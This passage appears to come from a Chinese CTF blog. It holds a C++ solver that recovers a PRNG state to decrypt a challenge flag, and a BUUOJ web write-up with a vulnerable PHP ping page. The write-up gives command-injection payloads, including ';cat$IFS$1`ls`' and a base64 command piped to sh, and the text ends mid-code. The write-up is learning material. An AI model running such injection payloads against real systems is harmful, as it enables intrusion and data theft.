class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;array&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;random&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bitset&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;m4ri/m4ri.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">uint8_t</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">uint64_t</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    x *= <span class=\"number\">5</span>;</span><br><span class=\"line\">    x = (x &lt;&lt; <span class=\"number\">7</span>) | (x &gt;&gt; (<span class=\"number\">64</span> - <span class=\"number\">7</span>));</span><br><span class=\"line\">    x *= <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x &gt;&gt; <span class=\"number\">56</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"type\">size_t</span> N_MONO = <span class=\"number\">1</span> + <span class=\"number\">256</span> + <span class=\"number\">256</span> * <span class=\"number\">255</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">using</span> deg2_rel = std::bitset&lt;<span class=\"number\">1</span> + <span class=\"number\">256</span> + <span class=\"number\">256</span> * <span class=\"number\">255</span> / <span class=\"number\">2</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">using</span> deg2_rel64 = std::bitset&lt;<span class=\"number\">1</span> + <span class=\"number\">64</span> + <span class=\"number\">64</span> * <span class=\"number\">63</span> / <span class=\"number\">2</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">using</span> lin_rel = std::bitset&lt;<span class=\"number\">256</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">sym_u64</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    lin_rel st[<span class=\"number\">64</span>] &#123;&#125;;</span><br><span class=\"line\">    sym_u64&amp; <span class=\"keyword\">operator</span>^=(<span class=\"type\">const</span> sym_u64&amp; rhs)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            st[i] ^= rhs.st[i];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sym_u64 <span class=\"keyword\">operator</span>^(<span class=\"type\">const</span> sym_u64&amp; rhs) <span class=\"type\">const</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 ret = *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">        ret ^= rhs;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sym_u64 <span class=\"keyword\">operator</span>&lt;&lt;(<span class=\"type\">int</span> by) <span class=\"type\">const</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 ret &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span> - by; i++)</span><br><span class=\"line\">            ret.st[i + by] = st[i];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sym_u64 <span class=\"keyword\">operator</span>&gt;&gt;(<span class=\"type\">int</span> by) <span class=\"type\">const</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 ret &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span> - by; i++)</span><br><span class=\"line\">            ret.st[i] = st[i + by];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">sym_u64 <span class=\"title\">rotl</span><span class=\"params\">(<span class=\"type\">int</span> by)</span> <span class=\"type\">const</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        sym_u64 ret &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            ret.st[(i + by)%<span class=\"number\">64</span>] = st[i];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">sym_xs256</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    sym_u64 s0, s1, s2, s3;</span><br><span class=\"line\">    <span class=\"built_in\">sym_xs256</span>()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            s0.st[i][i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            s1.st[i][i+<span class=\"number\">64</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            s2.st[i][i+<span class=\"number\">128</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            s3.st[i][i+<span class=\"number\">192</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">sym_u64 <span class=\"title\">step</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        sym_u64 res_s1 = s1;</span><br><span class=\"line\">        sym_u64 t = s1 &lt;&lt; <span class=\"number\">17</span>;</span><br><span class=\"line\">        s2 ^= s0;</span><br><span class=\"line\">        s3 ^= s1;</span><br><span class=\"line\">        s1 ^= s2;</span><br><span class=\"line\">        s0 ^= s3;</span><br><span class=\"line\">        s2 ^= t;</span><br><span class=\"line\">        s3 = s3.<span class=\"built_in\">rotl</span>(<span class=\"number\">45</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res_s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">std::array&lt;std::vector&lt;deg2_rel64&gt;, 256&gt; krels;</span><br><span class=\"line\"><span class=\"function\">deg2_rel <span class=\"title\">to_deg2</span><span class=\"params\">(lin_rel lhs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    deg2_rel ret &#123;&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">        ret[i+<span class=\"number\">1</span>] = lhs[i]; <span class=\"comment\">// 0 is the constant term</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">deg2_rel <span class=\"title\">mul</span><span class=\"params\">(lin_rel lhs, lin_rel rhs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    deg2_rel ret &#123;&#125;; <span class=\"comment\">// compute the product coefficients directly</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> mi = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ret[mi] = ret[mi] ^ (lhs[i] &amp; rhs[i]);</span><br><span class=\"line\">        mi++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; i; j++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ret[mi] = ret[mi] ^ (lhs[i] &amp; rhs[j]);</span><br><span class=\"line\">        ret[mi] = ret[mi] ^ (lhs[j] &amp; rhs[i]);</span><br><span class=\"line\">        mi++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    FILE* f = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;list_rels&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> buf[<span class=\"number\">4096</span>];</span><br><span class=\"line\">        <span class=\"type\">int</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ok = <span class=\"built_in\">fscanf</span>(f, <span class=\"string\">&quot;%d%s&quot;</span>, &amp;res, buf);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(ok &lt; <span class=\"number\">2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        deg2_rel64 rel &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; rel.<span class=\"built_in\">size</span>(); i++)</span><br><span class=\"line\">            rel[i] = buf[i] - <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">        krels[res].<span class=\"built_in\">push_back</span>(std::<span class=\"built_in\">move</span>(rel));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(f);</span><br><span class=\"line\">    sym_xs256 rng &#123;&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// we&#x27;re targeting the state before the flag is encrypted so skip some bytes now</span></span><br><span class=\"line\">    f = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;out_bin&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">constexpr</span> <span class=\"type\">int</span> FLAG_LEN = <span class=\"number\">41</span>;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> encflag[FLAG_LEN];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">41</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        encflag[i] = <span class=\"built_in\">fgetc</span>(f);</span><br><span class=\"line\">        rng.<span class=\"built_in\">step</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::vector&lt;deg2_rel&gt; all_rels;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2000</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;i=%d\\n&quot;</span>, i);</span><br><span class=\"line\">        <span class=\"type\">uint8_t</span> outb = <span class=\"built_in\">fgetc</span>(f);</span><br><span class=\"line\">        sym_u64 s1 = rng.<span class=\"built_in\">step</span>();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">const</span> deg2_rel64&amp; big_rel : krels[outb])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            deg2_rel res &#123;&#125;;</span><br><span class=\"line\">            <span class=\"type\">size_t</span> mi = <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(big_rel[<span class=\"number\">0</span>])</span><br><span class=\"line\">                res[<span class=\"number\">0</span>] = res[<span class=\"number\">0</span>] ^ <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(big_rel[mi])</span><br><span class=\"line\">                    res ^= <span class=\"built_in\">to_deg2</span>(s1.st[i]);</span><br><span class=\"line\">                mi++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; i; j++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(big_rel[mi])</span><br><span class=\"line\">                    res ^= <span class=\"built_in\">mul</span>(s1.st[i], s1.st[j]);</span><br><span class=\"line\">                mi++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            all_rels.<span class=\"built_in\">push_back</span>(res);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(f);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;%zu\\n&quot;</span>, all_rels.<span class=\"built_in\">size</span>());</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span> *A = <span class=\"built_in\">mzd_init</span>(all_rels.<span class=\"built_in\">size</span>(), N_MONO);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; all_rels.<span class=\"built_in\">size</span>(); i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; N_MONO; j++)</span><br><span class=\"line\">            <span class=\"built_in\">mzd_write_bit</span>(A, i, j, all_rels[i][j]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// we solve this system by linearization</span></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;starting solve\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;mat dim: %zu rows, %zu cols\\n&quot;</span>, A-&gt;nrows, A-&gt;ncols);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* ker = <span class=\"built_in\">mzd_kernel_left_pluq</span>(A, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* tker = <span class=\"built_in\">mzd_transpose</span>(<span class=\"literal\">nullptr</span>, ker);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;tker dim: %zu rows, %zu cols\\n&quot;</span>, tker-&gt;nrows, tker-&gt;ncols);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(A);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(ker);</span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(tker-&gt;nrows == <span class=\"number\">1</span>); <span class=\"comment\">// only 1 solution</span></span><br><span class=\"line\">    sym_xs256 rng2 &#123;&#125;;</span><br><span class=\"line\">    lin_rel ist; <span class=\"comment\">// the initial state. dot product with symbolic output equals concrete output</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">256</span>; j++)</span><br><span class=\"line\">        ist[j] = <span class=\"built_in\">mzd_read_bit</span>(tker, <span class=\"number\">0</span>, j + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; FLAG_LEN; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 s1 = rng2.<span class=\"built_in\">step</span>();</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">64</span>; j++)</span><br><span class=\"line\">            x |= <span class=\"built_in\">uint64_t</span>((s1.st[j] &amp; ist).<span class=\"built_in\">count</span>() % <span class=\"number\">2</span>) &lt;&lt; j;</span><br><span class=\"line\">        <span class=\"type\">uint8_t</span> outb = <span class=\"built_in\">func</span>(x);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, encflag[i] ^ outb);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"我的想法\"><a href=\"#我的想法\" class=\"headerlink\" title=\"我的想法\"></a>我的想法</h2><p>首先我感觉这玩意挺抽象的，思路先不谈，光那俩 cpp 除了春哥我不知道还有谁能这么点时间内造出来。<br>试着用 sage 写了下 <code>gen_rels.cpp</code>，直接慢了几十倍，好吧还是 C++ 厉害。（那之前的 MT19937 的题我是不是可以用 C++ 重写来着，又给自己挖个坑）</p>\n<p>先看看 <code>gen_rels.cpp</code> 干了些啥：对每一个 0-255 的 target，找到 20000 个能让 <code>f(x) == target</code> 的 x，然后把这些 x 的每一位都当作一个变量，构造一个矩阵，然后求这个矩阵的核，这个核就是 <code>f(x) == target</code> 的所有关系的矩阵表示。这里的矩阵是 20000*2081 的，然后用 M4RI 求核。<br>最终求出的每个向量与其对应 s1 expand 出的二次向量的内积都为 0。</p>\n<p>再看 <code>hax.cpp</code>，<del>疲软了，有空再来补坑。</del><br>时隔大半年回来补了（</p>\n<p>这里面真是一堆语法可真是把没学过 C++ 的我搞得一头雾水。<br>直接用最憨的方法，一个个看。</p>\n<p>函数 <code>func</code>： 将 <code>s1</code> 转成 <code>result</code><br><code>deg2_rel</code> 是一个 32897 维的向量，<code>deg2_rel64</code> 是 2081 维的向量，<code>lin_rel</code> 是 256 维的向量。<br>struct <code>sym_u64</code>： 64 维的向量，每一个分量都是一个 <code>lin_rel</code>，那么这应该算一个 64*256 的矩阵，并定义其异或、左移、右移、循环左移操作。<br>struct <code>sym_xs256</code>： 4 个 <code>sym_u64</code> 类型的 <code>s1 s2 s3 s4</code>，并定义了 <code>step</code> 操作，这里不是很懂，按理说这四个状态向量都是 64 位的。<br>定义了一个 <code>krels</code>，包含 256 个 <code>std::vector&lt;deg2_rel64&gt;</code> 类型的元素。每一个 <code>std::vector&lt;deg2_rel64&gt;</code> 可以包含任意数量的 <code>deg2_rel64</code> 对象。</p>\n<p>现在来看 <code>main</code> 函数：<br>把 <code>list_rels</code> 文件中的内容读入到 <code>krels</code> 中。<br>创建一个 <code>sym_xs256</code> 类的实例 <code>rng</code>，然后读进 encflag，每读一个字符更新一次 <code>rng</code> 的状态。<br>对每一个泄露的字节，找到所有 <code>krels</code> 中对应的 <code>big_rels</code>，然后对每一个 <code>big_rels</code>，新建一个类型为 <code>deg2_rel</code> 的 <code>res</code>，常数项（0 号位）和 <code>big_rels</code> 取等，1-64 号位是 $(b_1, b_2, \\cdots, b_{64})\\cdot(s_1,s_2,\\cdots,s_{64})^T$，左边的 $b$ 即为 <code>big_rels</code> 的 1-64 号位，右边是 s1 的 64*256 矩阵。后面没看懂。</p>\n<p>最后汇总到的一个 <code>all_rels</code>，求核得到的矩阵只有一个 32897 维的向量，剥出 1-256 号位得到 <code>ist</code>。</p>\n<p>整个看下来就是迷迷糊糊的。</p>\n<p>黑化了。</p>\n<p>I recently contacted the author of this challenge for assistance and was surprised by his quick response. Despite it being 00:30 when I reached out, he replied by 02:30. Given his username, I assumed he was in Russia, but his response time led me to question whether his work and rest schedule is typical or if he is not currently in Russia.</p>\n<p>The key to understanding the classes <code>sym_u64</code> and <code>sym_xs256</code> lies in the fact that the four states can be represented as a 256-bit vector. This representation forms a linear system that omits the non-linear scrambler <code>f(x)</code>. Thus, the state transition function can be expressed as a matrix, and the <code>step</code> function simply performs matrix multiplication. More specifically, the n-th state is obtained by multiplying the transition matrix $T$ by the initial state $n$ times.</p>\n<p>The construction of <code>res</code> can be explained as follows:</p>\n<p>First, it’s important to note that <code>s1</code> is a 64x256 matrix which, when multiplied by <code>ist</code>, yields the current real state of <code>s1</code>. Each <code>s1[i]</code> is a 256-dimensional vector; its dot product with <code>ist</code> determines the i-th bit of the current <code>s1</code>.<br>For each <code>res</code> in <code>all_rels</code>, <code>res</code> is computed by multiplying the <code>big_rel</code> (a 2081-dimensional vector) by a 2081x256 matrix, which is derived from <code>s1</code>.</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cs\">https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cs</a><br><a href=\"https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md\">https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md</a></p>"},{"title":"BUUOJ 之 Web 刷题记","date":"2023-09-14T05:09:00.000Z","_content":"\n这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）\n\n<!--more-->\n\n## 前言\n\n其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。\n现在密码也学了个半桶水，得着手全栈了。\n\n## 刷题\n\n### [GXYCTF2019]Ping Ping Ping\n\n题目给出一个 `?ip=`，显然是让我用 `GET` 方法传参，随便传个 `1` 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 `&&ls`，结果没反应，一看 wp 原来还能用分号的，`&&` 要上一条命令执行成功才会执行下一条，而 `;` 则是不管上一条命令是否成功都会执行下一条，所以这里用 `;` 就行了。\n\n然后难点在于正则过滤，`index.php` 内容如下：\n\n```php\n/?ip=\n<pre>PING 1 (0.0.0.1): 56 data bytes\n/?ip=\n<?php\nif(isset($_GET['ip'])){\n  $ip = $_GET['ip'];\n  if(preg_match(\"/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{1f}]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){\n    echo preg_match(\"/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{20}]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match);\n    die(\"fxck your symbol!\");\n  } else if(preg_match(\"/ /\", $ip)){\n    die(\"fxck your space!\");\n  } else if(preg_match(\"/bash/\", $ip)){\n    die(\"fxck your bash!\");\n  } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\n    die(\"fxck your flag!\");\n  }\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  echo \"<pre>\";\n  print_r($a);\n}\n\n?>\n```\n\n这里过滤了空格和 flag，所以不能直接 `cat flag.php`，wp 的 payload 是\n\n```bash\n?ip=127.0.0.1;cat$IFS$1`ls`\n```\n\n`$IFS` 是空格，`$1` 是第一个参数，所以这里就是 `cat flag.php index.php`，然后就能看到 flag 了。注意这里的 `$1` 会带出 `ls` 的所有结果而不仅仅是 `flag.php`。所以 `cat` 出来的是目录下所有文件。\n\n解法二是 `echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`，这里的 `Y2F0IGZsYWcucGhw` 是 `cat flag.php` 的 base64 编码，`-d` 是解码，然后传到 `sh` 执行。注意到 `index.php` 只过滤了 `bash`，所以这里可以用 `sh`。\n\n### [强网杯 2019]随便注\n\n最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。\n\n随便填个 1 提交后返回\n\n```sql\narray(2) {\n  [0]=>\n  string(1) \"1\"\n  [1]=>\n  string(7) \"hahahah\"\n}\n```\n\n从网上抄的 `1' or '1'='1` 不管用，有空再回来补。\n\n### [SUCTF 2019]EasySQL\n\n抄的 wp：`*,1`，也不懂，有空补。\n\n### [极客大挑战 2019]Secret File\n\nF12 看到\n\n```html\n<a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\">Oh! You found me</a>\n```\n\n转到 `Archive_room.php`，有一个按钮指向 `action.php`，点了之后是一个 302 后的 `end.php`。应该是跳到 `action.php` 然后光速重定向到 `end.php`，所以没看到 `action.php` 的内容。\n用 burpsuite 抓包，发现 `action.php` 有个 `secr3t.php`，进去后是以下代码\n\n```php\n<html>\n    <title>secret</title>\n    <meta charset=\"UTF-8\">\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file=$_GET['file'];\n    